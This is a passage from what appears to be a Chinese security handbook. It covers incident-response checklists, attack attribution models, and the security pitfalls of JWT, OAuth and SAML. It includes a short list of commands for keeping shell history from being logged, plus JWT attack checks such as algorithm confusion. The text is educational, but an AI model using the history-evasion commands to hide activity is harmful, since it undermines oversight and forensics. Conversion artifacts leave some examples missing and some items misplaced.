start='2' ><li><h3 id='事件分类'><span>事件分类</span></h3><ul><li><p><span>病毒、木马、蠕虫事件</span></p></li><li><p><span>Web 服务器入侵事件</span></p></li><li><p><span>第三方服务入侵事件</span></p></li><li><h4 id='系统入侵事件'><span>系统入侵事件</span></h4><ul><li><span>利用 Windows 漏洞攻击操作系统</span></li></ul></li><li><h4 id='网络攻击事件'><span>网络攻击事件</span></h4><ul><li><span>DDoS / ARP 欺骗 / DNS 劫持等</span></li></ul></li></ul></li><li><h3 id='分析方向'><span>分析方向</span></h3></li></ol><h4 id='文件分析-1'><span>文件分析</span></h4><ul><li><p><strong><span>基于变化的分析</span></strong></p><ul><li><span>日期</span></li><li><span>文件增改</span></li><li><span>最近使用文件</span></li></ul></li><li><h4 id='源码分析'><span>源码分析</span></h4><ul><li><span>检查源码改动</span></li><li><span>查杀 WebShell 等后门</span></li></ul></li><li><p><span>系统日志分析</span></p></li><li><h4 id='应用日志分析'><span>应用日志分析</span></h4><ul><li><span>分析 User-Agent，e.g. awvs / burpsuite / w3af / nessus / openvas</span></li><li><span>对每种攻击进行关键字匹配，e.g. select/alert/eval</span></li><li><span>异常请求，连续的 404 或者 500</span></li></ul></li><li><p><span>md5sum 检查常用命令二进制文件的哈希，检查是否被植入 rootkit</span></p></li></ul><h4 id='进程分析-1'><span>进程分析</span></h4><ul><li><p><strong><span>符合以下特征的进程</span></strong></p><ul><li><span>CPU 或内存资源占用长时间过高</span></li><li><span>没有签名验证信息</span></li><li><span>没有描述信息的进程</span></li><li><span>进程的路径不合法</span></li></ul></li><li><p><span>dump 系统内存进行分析</span></p></li><li><p><span>正在运行的进程</span></p></li><li><p><span>正在运行的服务</span></p></li><li><p><span>父进程和子进程</span></p></li><li><p><span>后台可执行文件的完整哈希</span></p></li><li><p><span>已安装的应用程序</span></p></li><li><p><span>运行着密钥或其他正在自动运行的持久化程序</span></p></li><li><p><span>计划任务</span></p></li></ul><h4 id='身份信息分析'><span>身份信息分析</span></h4><ul><li><span>本地以及域账号用户</span></li><li><span>异常的身份验证</span></li><li><span>非标准格式的用户名</span></li></ul><h4 id='日志分析-2'><span>日志分析</span></h4><ul><li><span>杀软检测记录</span></li></ul><h4 id='网络分析'><span>网络分析</span></h4><ul><li><span>防火墙配置</span></li><li><span>DNS 配置</span></li><li><span>路由配置</span></li><li><span>监听端口和相关服务</span></li><li><span>最近建立的网络连接</span></li><li><span>RDP / VPN / SSH 等会话</span></li></ul><h4 id='配置分析'><span>配置分析</span></h4><ul><li><span>查看 Linux SE 等配置</span></li><li><span>查看环境变量</span></li><li><span>查看配套的注册表信息检索，SAM 文件</span></li><li><span>内核模块</span></li></ul><h3 id='linux-应急响应'><span>Linux 应急响应</span></h3><h4 id='文件分析-2'><span>文件分析</span></h4><ul><li><p><strong><span>最近使用文件</span></strong></p><ul><li><span>find / -ctime -2</span></li><li><span>C:</span><span>\</span><span>Documents and Settings</span><span>\</span><span>Administrator</span><span>\</span><span>Recent</span></li><li><span>C:</span><span>\</span><span>Documents and Settings</span><span>\</span><span>Default User</span><span>\</span><span>Recent</span></li><li><span>%UserProfile%</span><span>\</span><span>Recent</span></li></ul></li><li><h4 id='系统日志分析-1'><span>系统日志分析</span></h4><ul><li><span>/var/log/</span></li></ul></li><li><h4 id='重点分析位置'><span>重点分析位置</span></h4><ul><li><span>/var/log/wtmp 登录进入，退出，数据交换、关机和重启纪录</span></li><li><span>/var/run/utmp 有关当前登录用户的信息记录</span></li><li><span>/var/log/lastlog 文件记录用户最后登录的信息，可用 lastlog 命令来查看。</span></li><li><span>/var/log/secure 记录登入系统存取数据的文件，例如 pop3/ssh/telnet/ftp 等都会被记录。</span></li><li><span>/var/log/cron 与定时任务相关的日志信息</span></li><li><span>/var/log/message 系统启动后的信息和错误日志</span></li><li><span>/var/log/apache2/access.log apache access log</span></li><li><span>/etc/passwd 用户列表</span></li><li><span>/etc/init.d/ 开机启动项</span></li><li><span>/etc/cron</span><span>*</span><span> 定时任务</span></li><li><span>/tmp 临时目录</span></li><li><span>~</span><span>/.ssh</span></li></ul></li></ul><h4 id='用户分析-1'><span>用户分析</span></h4><ul><li><span>/etc/shadow 密码登陆相关信息</span></li><li><span>uptime 查看用户登陆时间</span></li><li><span>/etc/sudoers sudo 用户列表</span></li></ul><h4 id='进程分析-2'><span>进程分析</span></h4><ul><li><p><span>netstat -ano 查看是否打开了可疑端口</span></p></li><li><p><span>w 命令，查看用户及其进程</span></p></li><li><h4 id='mediaimage6pngwidth013194444444444445in-height013194444444444445in分析开机自启程序脚'><img src="media/image6.png" referrerpolicy="no-referrer"><span>分析开机自启程序/脚</span></h4><ul><li><span>/etc/init.d</span></li><li><span>~</span><span>/.bashrc</span></li></ul></li><li><h4 id='查看计划或定时任务-1'><span>查看计划或定时任务</span></h4><ul><li><span>crontab -l</span></li></ul></li><li><p><span>netstat -an / lsof 查看进程端口占用</span></p></li></ul><h3 id='windows-应急响应'><span>Windows 应急响应</span></h3><h4 id='文件分析-3'><span>文件分析</span></h4><ul><li><p><strong><span>最近使用文件</span></strong></p><ul><li><span>C:</span><span>\</span><span>Documents and Settings</span><span>\</span><span>Administrator</span><span>\</span><span>Recent</span></li><li><span>C:</span><span>\</span><span>Documents and Settings</span><span>\</span><span>Default User</span><span>\</span><span>Recent</span></li><li><span>%UserProfile%</span><span>\</span><span>Recent</span></li></ul></li><li><h4 id='系统日志分析-2'><span>系统日志分析</span></h4><ul><li><span>事件查看器 eventvwr.msc</span></li></ul></li></ul><h4 id='用户分析-2'><span>用户分析</span></h4><ul><li><span>查看是否有新增用户</span></li><li><span>查看服务器是否有弱口令</span></li><li><span>查看管理员对应键值</span></li><li><span>lusrmgr.msc 查看账户变化</span></li><li><span>net user 列出当前登录账户</span></li><li><span>wmic UserAccount get 列出当前系统所有账户</span></li></ul><h4 id='进程分析-3'><span>进程分析</span></h4><ul><li><p><span>netstat -ano 查看是否打开了可疑端口</span></p></li><li><p><span>tasklist 查看是否有可疑进程</span></p></li><li><h4 id='分析开机自启程序'><span>分析开机自启程序</span></h4><ul><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Run</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Runonce</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServices</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServicesOnce</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>policies</span><span>\</span><span>Explorer</span><span>\</span><span>Run</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Run</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunOnce</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServices</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServicesOnce</span></li><li><span>(ProfilePath)</span><span>\</span><span>Start Menu</span><span>\</span><span>Programs</span><span>\</span><span>Startup 启动项</span></li><li><span>msconfig 启动选项卡</span></li><li><span>gpedit.msc 组策略编辑器</span></li></ul></li><li><h4 id='查看计划或定时任务-2'><span>查看计划或定时任务</span></h4><ul><li><span>C:</span><span>\</span><span>Windows</span><span>\</span><span>System32</span><span>\</span><span>Tasks</span><span>\</span></li><li><span>C:</span><span>\</span><span>Windows</span><span>\</span><span>SysWOW64</span><span>\</span><span>Tasks</span><span>\</span></li><li><span>C:</span><span>\</span><span>Windows</span><span>\</span><span>tasks</span><span>\</span></li><li><span>schtasks</span></li><li><span>taskschd.msc</span></li><li><span>compmgmt.msc</span></li></ul></li><li><h4 id='查看启动服务'><span>查看启动服务</span></h4><ul><li><span>services.msc</span></li></ul></li></ul><h4 id='日志分析-3'><span>日志分析</span></h4><ul><li><p><strong><span>事件查看</span></strong></p><ul><li><span>eventvwr.msc</span></li></ul></li></ul><h4 id='其他-5'><span>其他</span></h4><ul><li><span>查看系统环境变量</span></li></ul><ol start='6' ><li><h3 id='参考链接-参考链接-47'><span>参考链接 {#参考链接-47}</span></h3><ul><li><a href='https://xz.aliyun.com/t/1140'><span>黑客入侵应急分析手工排查</span></a></li><li><a href='http://www.freebuf.com/column/147929.html'><span>取证入门 web 篇</span></a></li><li><a href='https://xz.aliyun.com/t/2524'><span>Windows 系统安全事件应急响应</span></a></li><li><a href='https://xz.aliyun.com/t/1632'><span>企业安全应急响应</span></a></li><li><a href='https://us-cert.cisa.gov/ncas/alerts/aa20-245a'><span>Technical Approaches to Uncovering and Remediating Malicious Activity</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='5' ><li><h2 id='溯源分析'><span>溯源分析</span></h2><ol start='' ><li><h3 id='攻击机溯源技术'><span>攻击机溯源技术</span></h3></li></ol></li></ol><h4 id='基于日志的溯源'><span>基于日志的溯源</span></h4><blockquote><p><span>使用路由器、主机等设备记录网络传输的数据流中的关键信息 (时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。</span></p><p><span>这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。</span></p></blockquote><h4 id='路由输入调试技术'><span>路由输入调试技术</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><img src="media/image1.png" referrerpolicy="no-referrer"><span>在攻击持续发送数据， 特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在 DDoS 攻击追溯中比较有效， 网络开销较小。</span></p></blockquote><h4 id='可控洪泛技术'><span>可控洪泛技术</span></h4><blockquote><p><span>追踪时向潜在的上游路由器进行洪泛攻击，如果发现收到的攻击流量变少则攻击流量会流经相应的路由。这种方式的优点在于不需要预先部署，对协同的需求比较少。但是这种方式本身是一种攻击，会对网络有所影响。</span></p></blockquote><h4 id='基于包数据修改追溯技术'><span>基于包数据修改追溯技术</span></h4><blockquote><p><span>这种溯源方式直接对数据包进行修改，加入编码或者标记信息，在接收端对传输路径进行重构。这种方式人力投入较少，支持事后分析，但是对某些协议的支持性不太好。</span></p><p><span>基于这种方式衍生出了随机标记技术，各路由以一定概率对数据包进行标识，接收端收集到多个包后进行重构。</span></p></blockquote><ol start='2' ><li><h3 id='基于蜜罐溯源'><span>基于蜜罐溯源</span></h3><ul><li><span>社交网络 jsonp API</span></li><li><span>获取攻击者 IP</span></li><li><span>获取 burp 信息</span></li></ul></li><li><h3 id='分析模型'><span>分析模型</span></h3></li></ol><h4 id='杀伤链-kill-kain-模型'><span>杀伤链 (Kill Kain) 模型</span></h4><blockquote><p><span>杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪 (Reconnais- sance)、武器构建 (Weaponization)、载荷投递 (Delivery)、漏洞利用 (Exploitation)、安装植入 (Installation)、通信控制 (Command&amp;Control)、达成目标 (Actions on Objective) 等几个阶段。</span></p><p><span>在越早的杀伤链环节阻止攻击，防护效果就越好，因此杀伤链的概念也可以用来反制攻击。</span></p><p><span>在跟踪阶段，攻击者通常会采用扫描和搜索等方式来寻找可能的目标信息并评估攻击成本。在这个阶段可以通过日志分析、邮件分析等方式来发现，这阶段也可以采用威胁情报等方式来获取攻击信息。</span></p><p><span>武器构建阶段攻击者通常已经准备好了攻击工具，并进行尝试性的攻击，在这个阶段 IDS 中可能有攻击记录，外网应用、邮箱等帐号可能有密码爆破的记录。有一些攻击者会使用公开攻击工具，会带有一定的已知特征。</span></p><p><span>载荷投递阶段攻击者通常会采用网络漏洞、鱼叉、水坑、网络劫持、U 盘等方式投送恶意代码。此阶段已经有人员在对应的途径收到了攻击载荷，对人员进行充分的安全培训可以做到一定程度的防御。</span></p><p><span>突防利用阶段攻击者会执行恶意代码来获取系统控制权限，此时木马程序已经执行，此阶段可以依靠杀毒软件、异常行为告警等方式来找到相应的攻击。</span></p><p><span>安装植入阶段攻击者通常会在 web 服务器上安装 Webshell 或植入后门、rootkit 等来实现对服务器的持久化控制。可以通过对样本进行逆向工程来找到这些植入。</span></p><p><span>通信控制阶段攻击者已经实现了远程通信控制，木马会通过 Web 三方网站、DNS 隧道、邮件等方式和控制服务器进行通信。此时可以通过对日志进行分析来找到木马的痕迹。</span></p><p><span>达成目标阶段时，攻击者开始完成自己的目的，可能是破坏系统正常运行、窃取目标数据、敲诈勒索、横向移动等。此时受控机器中可能已经有攻击者的上传的攻击利用工具，此阶段可以使用蜜罐等方式来发现。</span></p></blockquote><h4 id='钻石-diamond-模型'><span>钻石 (Diamond) 模型</span></h4><blockquote><p><span>钻石模型由网络情报分析与威胁研究中心 (The Center for Cyber Intelligence Anaysis and Threat Research， CCIATR) 机构的 Sergio Catagirone 等人在 2013 年提出。</span></p><p><span>该模型把所有的安全事件 (Event) 分为四个核心元素，即敌手 (Adversary)，能力 (Capability)，基础设施 (Infrastructure) 和受害者 (Victim)，以菱形连线代表它们之间的关系，因而命名为</span>“<span>钻石模型</span>”<span>。</span></p><p><span>杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。</span></p><p><span>在使用钻石模型分析时，通常使用支点分析的方式。支点 (Pivoting) 指提取一个元素，并利用该元素与数据源相结合以发现相关元素的分析技术。分析中可以随时变换支点，四个核心特征以及两个扩展特征 (社会政治、技术) 都可能成为当时的分析支点。</span></p></blockquote><h3 id='关联分析方法'><span>关联分析方法</span></h3><blockquote><p><span>关联分析用于把多个不同的攻击样本结合起来。</span></p></blockquote><h4 id='文档类'><span>文档类</span></h4><ul><li><span>hash</span></li><li><span>ssdeep</span></li><li><span>版本信息 (公司/作者/最后修改作者/创建时间/最后修改时间)</span></li></ul><h4 id='行为分析'><span>行为分析</span></h4><ul><li><p><strong><span>基于网络行为</span></strong></p><ul><li><span>类似的交互方式</span></li></ul></li></ul><h4 id='可执行文件相似性分析'><span>可执行文件相似性分析</span></h4><ul><li><p><span>特殊端口</span></p></li><li><p><span>特殊字符串/密钥</span></p></li><li><h4 id='pdb-文件路径'><span>PDB 文件路径</span></h4><ul><li><span>相似的文件夹</span></li></ul></li><li><h4 id='代码复用'><span>代码复用</span></h4><ul><li><span>相似的代码片段</span></li></ul></li></ul><ol start='5' ><li><h3 id='清除日志方式'><span>清除日志方式</span></h3><ul><li><span>kill </span><span>&lt;</span><span>bash process ID</span><span>&gt;</span><span> 不会存储</span></li><li><span>set +o history 不写入历史记录</span></li><li><span>unset HISTFILE 清除历史记录的环境变量</span></li></ul></li><li><h3 id='参考链接-参考链接-48'><span>参考链接 {#参考链接-48}</span></h3><ul><li><a href='https://mp.weixin.qq.com/s/vlr2X68tMTgDhdDk4aow0g'><span>利用社交账号精准溯源的蜜罐技术</span></a></li></ul></li></ol><p><span>CHAPTER 9</span></p><p><span>认证机制</span></p><h2 id='多因子认证'><span>多因子认证</span></h2><blockquote><p><span>多因子认证是在单因子认证不足以保证安全性时使用的方法，通常会引入多种方式对用户身份进行验证。身份验证方法可以基于知识的认证，即密码；也可以基于物品的认证，例如硬件密钥；也可以是基于特征的认证，例如包含指纹在内的生物特征等。</span></p></blockquote><ol start='2' ><li><h1 id='sso-2'><span>SSO</span></h1><ol start='' ><li><h3 id='简介-39'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>单点登录 (SingleSignOn，SSO) 指一个用户可以通过单一的 ID 和凭证（密码）访问多个相关但彼此独立的系统。</span></p></blockquote><h4 id='常见流程'><span>常见流程</span></h4><ol start='' ><li><span>用户 (User) 向服务提供商 (Service Provider) 发起请求</span></li><li><span>SP 重定向 User 至 SSO 身份校验服务 (Identity Provider)</span></li><li><span>User 通过 IP 登录</span></li><li><span>IP 返回凭证给 User</span></li><li><span>User 将凭证发给 SP</span></li></ol><h4 id='305'><span>305</span></h4><ol start='6' ><li><span>SP 返回受保护的资源给用户其中凭证要有以下属性</span></li></ol><ul><li><p><span>签发者的签名</span></p></li><li><p><span>凭证的身份</span></p></li><li><h4 id='使用的时间'><span>使用的时间</span></h4><ul><li><p><span>过期时间</span></p></li><li><p><span>生效时间</span></p><ol start='' ><li><h3 id='可能的攻击漏洞'><span>可能的攻击/漏洞</span></h3></li></ol></li></ul></li></ul><h4 id='信息泄漏'><span>信息泄漏</span></h4><blockquote><p><span>若 SP 和 IP 之前使用明文传输信息，可能会被窃取。</span></p></blockquote><h4 id='伪造-1'><span>伪造</span></h4><blockquote><p><span>如果在通信过程中没有对关键信息进行签名，容易被伪造。</span></p></blockquote><ol start='' ><li><h1 id='jwt-1'><span>JWT</span></h1><ol start='' ><li><h3 id='简介-40'><span>简介</span></h3></li></ol></li></ol><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（(RFC 7519). 该 token 被设计为紧凑 安全的，特别适用于分布式站点的单点登录（SSO)场景。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该 token 也可直接被用于认证，也可被加密。</span></p></blockquote><h3 id='构成'><span>构成</span></h3><blockquote><p><span>分为三个部分，分别为 header/payload/signature。其中 header 是声明的类型和加密使用的算法。payload是载荷，最后是加上 HMAC(base64(header)+base64(payload), secret)</span></p></blockquote><h3 id='安全问题-1'><span>安全问题</span></h3><h4 id='header-部分'><span>Header 部分</span></h4><ul><li><span>是否支持修改算法为 none/对称加密算法</span></li><li><span>删除签名</span></li><li><span>插入错误信息</span></li><li><span>kid 字段是否有 SQL 注入/命令注入/目录遍历</span></li><li><span>jwk 元素是否可信</span></li><li><span>是否强制使用白名单上的加密算法</span></li></ul><h4 id='payload-部分'><span>Payload 部分</span></h4><ul><li><span>其中是否存在敏感信息</span></li><li><span>检查过期策略，比如 exp , iat</span></li></ul><h4 id='signature-部分'><span>Signature 部分</span></h4><ul><li><span>检查是否强制检查签名</span></li><li><span>密钥是否可以爆破</span></li><li><span>是否可以通过其他方式拿到密钥</span></li></ul><h4 id='其他-6'><span>其他</span></h4><ul><li><p><span>重放</span></p></li><li><p><span>通过匹配校验的时间做时间攻击</span></p></li><li><p><span>修改算法 RS256 为 HS256</span></p></li><li><p><span>弱密钥破解</span></p><ol start='' ><li><h3 id='参考链接-参考链接-49'><span>参考链接 {#参考链接-49}</span></h3></li></ol></li></ul><p>&nbsp;</p><ul><li><p><a href='https://auth0.com/blog/'><span>Critical vulnerabilities in JSON Web Token libraries</span></a></p><ol start='' ><li><h2 id='oauth'><span>OAuth</span></h2><ol start='' ><li><h3 id='简介-41'><span>简介</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>OAuth 是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是 2.0 版。</span></p><p><span>OAuth 在客户端与服务端之间，设置了一个授权层（authorization layer）。客户端不能直接登录服务端，只能登录授权层，以此将用户与客户端区分开来。客户端登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</span></p><p><span>客户端登录授权层以后，服务端根据令牌的权限范围和有效期，向客户端开放用户储存的资料。</span></p><p><span>OAuth 2.0 定义了四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）和客户端模式（client credentials）。</span></p></blockquote><h3 id='流程'><span>流程</span></h3><ul><li><p><span>用户打开客户端以后，客户端要求用户给予授权</span></p></li><li><p><span>用户同意给予客户端授权</span></p></li><li><p><span>客户端使用上一步获得的授权，向认证服务器申请令牌</span></p></li><li><p><span>认证服务器对客户端进行认证以后，确认无误，同意发放令牌</span></p></li><li><p><span>客户端使用令牌，向资源服务器申请获取资源</span></p></li><li><p><span>资源服务器确认令牌无误，同意向客户端开放资源</span></p><ol start='' ><li><h3 id='授权码模式'><span>授权码模式</span></h3></li></ol></li></ul><blockquote><p><span>授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与服务端的认证服务器进行互动。</span></p><p><span>其流程为：</span></p></blockquote><ul><li><span>用户访问客户端，后者将前者导向认证服务器</span></li><li><span>用户选择是否给予客户端授权</span></li><li><span>假设用户给予授权，认证服务器将用户导向客户端事先指定的</span>”<span> 重定向 URI</span>“<span>（redirection URI），同时附上一个授权码</span></li><li><span>客户端收到授权码，附上早先的</span>”<span> 重定向 URI</span>“<span>，向认证服务器申请令牌</span></li><li><span>认证服务器核对了授权码和重定向 URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）</span></li></ul><blockquote><p><span>A 步骤中，客户端申请认证的 URI，包含以下参数：</span></p></blockquote><ul><li><span>response_type：表示授权类型，必选项，此处的值固定为 code</span></li><li><span>client_id：表示客户端的 ID，必选项</span></li><li><span>redirect_uri：表示重定向 URI，可选项</span></li><li><span>scope：表示申请的权限范围，可选项</span></li><li><span>state：表示客户端的当前状态，需动态指定，防止 CSRF</span></li></ul><blockquote><p><span>例如：</span></p><p><span>C 步骤中，服务器回应客户端的 URI，包含以下参数：</span></p></blockquote><ul><li><img src="media/image1.png" referrerpolicy="no-referrer"><span>code：表示授权码，必选项。该码的有效期应该很短 客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端 ID 和重定向 URI，是一一对应关系。</span></li><li><span>state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数例如：</span></li></ul><blockquote><p><span>D 步骤中，客户端向认证服务器申请令牌的 HTTP 请求，包含以下参数：</span></p></blockquote><ul><li><span>grant_type：表示使用的授权模式，必选项，此处的值固定为 authorization_code</span></li><li><span>code：表示上一步获得的授权码，必选项</span></li><li><img src="media/image1.png" referrerpolicy="no-referrer"><span>redirect_uri：表示重定向 URI，必选项， 必须与 A 步骤中的该参数值保持一致</span></li><li><span>client_id：表示客户端 ID，必选项例如：</span></li></ul><blockquote><p><span>E 步骤中，认证服务器发送的 HTTP 回复，包含以下参数：</span></p></blockquote><ul><li><p><span>access_token：表示访问令牌，必选项</span></p></li><li><p><span>token_type：表示令牌类型，该值大小写不敏感，必选项，可以是 bearer 类型或 mac 类型</span></p></li><li><p><span>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间</span></p></li><li><p><span>refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项</span></p></li><li><p><span>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略例如：</span></p><ol start='' ><li><h3 id='简化模式'><span>简化模式</span></h3></li></ol></li></ul><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>简化模式（implicit grant type)不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了授权码这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的， 客户端不需要认证。</span></p><p><span>其步骤为：</span></p></blockquote><ul><li><span>客户端将用户导向认证服务器</span></li><li><span>用户决定是否给于客户端授权</span></li><li><span>假设用户给予授权，认证服务器将用户导向客户端指定的重定向 URI，并在 URI 的 Hash 部分包含了访问令牌</span></li><li><span>浏览器向资源服务器发出请求，其中不包括上一步收到的 Hash 值</span></li><li><span>资源服务器返回一个网页，其中包含的代码可以获取 Hash 值中的令牌</span></li><li><span>浏览器执行上一步获得的脚本，提取出令牌</span></li><li><span>浏览器将令牌发给客户端</span></li></ul><blockquote><p><span>A 步骤中，客户端发出的 HTTP 请求，包含以下参数：</span></p></blockquote><ul><li><span>response_type：表示授权类型，此处的值固定为 token ，必选项</span></li><li><span>client_id：表示客户端的 ID，必选项</span></li><li><span>redirect_uri：表示重定向的 URI，可选项</span></li><li><span>scope：表示权限范围，可选项</span></li><li><span>state：表示客户端的当前状态，需动态指定，防止 CSRF</span></li></ul><blockquote><p><span>例如：</span></p><p><span>C 步骤中，认证服务器回应客户端的 URI，包含以下参数：</span></p></blockquote><ul><li><span>access_token：表示访问令牌，必选项</span></li><li><span>token_type：表示令牌类型，该值大小写不敏感，必选项</span></li><li><span>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间</span></li><li><span>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略</span></li><li><span>state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数例如：</span></li></ul><blockquote><p><span>在上面的例子中，认证服务器用 HTTP 头信息的 Location 栏，指定浏览器重定向的网址。注意，在这个网址的 Hash 部分包含了令牌。</span></p><p><span>根据上面的 D 步骤，下一步浏览器会访问 Location 指定的网址，但是 Hash 部分不会发送。接下来的 E 步骤，服务提供商的资源服务器发送过来的代码，会提取出 Hash 中的令牌。</span></p></blockquote><h3 id='密码模式'><span>密码模式</span></h3><blockquote><p><span>密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向</span>”<span> 服务商提供商</span>”<span> 索要授权。</span></p><p><span>在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。其步骤如下：</span></p></blockquote><ul><li><span>用户向客户端提供用户名和密码</span></li><li><span>客户端将用户名和密码发给认证服务器，向后者请求令牌</span></li><li><span>认证服务器确认无误后，向客户端提供访问令牌</span></li></ul><blockquote><p><span>B 步骤中，客户端发出的 HTTP 请求，包含以下参数：</span></p></blockquote><ul><li><span>grant_type：表示授权类型，此处的值固定为 password ，必选项</span></li><li><span>username：表示用户名，必选项</span></li><li><span>password：表示用户的密码，必选项</span></li><li><span>scope：表示权限范围，可选项</span></li></ul><blockquote><p><span>例如：</span></p><p><span>C 步骤中，认证服务器向客户端发送访问令牌，例如：</span></p></blockquote><h3 id='客户端模式'><span>客户端模式</span></h3><blockquote><p><span>客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向服务端进行认证。其步骤如下：</span></p></blockquote><ul><li><span>客户端向认证服务器进行身份认证，并要求一个访问令牌</span></li><li><span>认证服务器确认无误后，向客户端提供访问令牌</span></li></ul><blockquote><p><span>A 步骤中，客户端发出的 HTTP 请求，包含以下参数：</span></p></blockquote><ul><li><span>granttype：表示授权类型，此处的值固定为 clientcredentials ，必选项</span></li><li><span>scope：表示权限范围，可选项例如：</span></li></ul><p><span>(下页继续)</span></p><p><span>(续上页)</span></p><blockquote><p><span>B 步骤中，认证服务器向客户端发送访问令牌，例如：</span></p></blockquote><h3 id='参考链接-参考链接-50'><span>参考链接 {#参考链接-50}</span></h3><ul><li><p><a href='http://www.rfcreader.com/#rfc6749'><span>rfc6749</span></a></p></li><li><p><a href='http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html'><span>理解 OAuth</span></a></p></li><li><p><a href='https://ldapwiki.com/wiki/OAuth%202.0%20Vulnerabilities'><span>OAuth 2.0 Vulnerabilities</span></a></p></li><li><p><a href='https://oauth.net/'><span>OAuth Community Site</span></a></p></li><li><p><a href='https://portswigger.net/research/hidden-oauth-attack-vectors'><span>Hidden OAuth attack vectors</span></a></p><ol start='' ><li><h1 id='saml'><span>SAML</span></h1><ol start='' ><li><h3 id='简介-42'><span>简介</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>SAML (Security Assertion Markup Language) 译为安全断言标记语言，是一种 xXML 格式的语言，使用</span></p><p><span>XML 格式交互，来完成 SSO 的功能。</span></p><p><span>SAML 存在 1.1 和 2.0 两个版本，这两个版本不兼容，不过在逻辑概念或者对象结构上大致相当，只是在一些细节上有所差异。</span></p></blockquote><h3 id='认证过程'><span>认证过程</span></h3><blockquote><p><span>SAML 的认证涉及到三个角色，分别为服务提供者 (SP)、认证服务 (IDP)、用户 (Client)。一个比较典型认证过程如下：</span></p></blockquote><ol start='' ><li><span>Client 访问受保护的资源</span></li><li><span>SP 生成认证请求 SAML 返回给 Client</span></li><li><span>Client 提交请求到 IDP</span></li><li><span>IDP 返回认证请求</span></li><li><span>Client 登陆 IDP</span></li><li><span>认证成功后，IDP 生成私钥签名标识了权限的 SAML，返回给 Client</span></li><li><span>Client 提交 SAML 给 SP</span></li><li><span>SP 读取 SAML，确定请求合法，返回资源</span></li></ol><h3 id='安全问题-2'><span>安全问题</span></h3><ul><li><p><span>源于 ssl 模式下的认证可选性，可以删除签名方式标签绕过认证</span></p></li><li><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>如果 SAML 中缺少了 expiration，并 断言 ID 不是唯一的，那么就可能被重放攻击影响</span></p><ol start='' ><li><h3 id='参考链接-参考链接-51'><span>参考链接 {#参考链接-51}</span></h3></li></ol></li></ul><p>&nbsp;</p><ul><li><p><a href='https://en.wikipedia.org/wiki/SAML_2.0'><span>SAML Wiki</span></a></p></li><li><p><a href='https://tools.ietf.org/html/rfc7522'><span>RFC7522</span></a></p></li><li><p><a 